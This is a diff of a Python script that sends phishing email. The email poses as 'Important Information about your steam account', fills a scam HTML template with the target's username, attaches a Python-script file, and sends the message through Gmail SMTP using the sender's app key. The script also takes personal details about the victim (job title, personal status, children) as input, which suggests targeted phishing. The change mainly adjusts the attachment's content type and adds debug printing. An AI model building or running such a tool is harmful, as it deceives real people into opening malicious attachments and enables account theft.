@@ -37,33 +37,42 @@ def function(array):
     kids = sys.argv[6]
     mail_receiver_address = username + "@" + mail_service_name
 
-    fp = open(scam_html_file , "r")
+    print("username: ", username)
+    print("mail service name: ", mail_service_name)
+    print("title: ", title)
+    print("job title: ", job_title)
+    print("personal status: ", personal_status)
+    print("kids: ", kids)
+
+    fp = open(scam_html_file, "r")
     html = fp.read()
-    html = html.replace("user", username)
+    html = html.replace("{{user}}", username)
     fp.close()
 
     message = MIMEMultipart("alternative")
+
     message["Subject"] = "Important Information about your steam account"
     message["From"] = mail_sender_address
     message["To"] = mail_receiver_address
 
     html_message = MIMEText(html, "html")
 
-    message.attach(html_message)
-
     with open(attachment_file, "rb") as file:
-        attachment = MIMEBase("application", "octet-stream")
+        attachment = MIMEBase("text", "x-python")  # Set content type to "text/x-python"
         attachment.set_payload(file.read())
         encoders.encode_base64(attachment)
-        attachment.add_header("Content-Disposition",
-                              f"attachment; filename={attachment_file}")
+        attachment.add_header("Content-Disposition", f"attachment; filename={attachment_file}")
         message.attach(attachment)
+
+    message.attach(html_message)
 
     context = ssl.create_default_context()
 
     with smtplib.SMTP_SSL("smtp.gmail.com", smtp_port, context=context) as server:
         server.login(mail_sender_address, application_key)
         server.sendmail(mail_sender_address, mail_receiver_address, message.as_string())
+
+    print("Mail sent to: " + mail_receiver_address)
 
 
 if __name__ == "__main__":
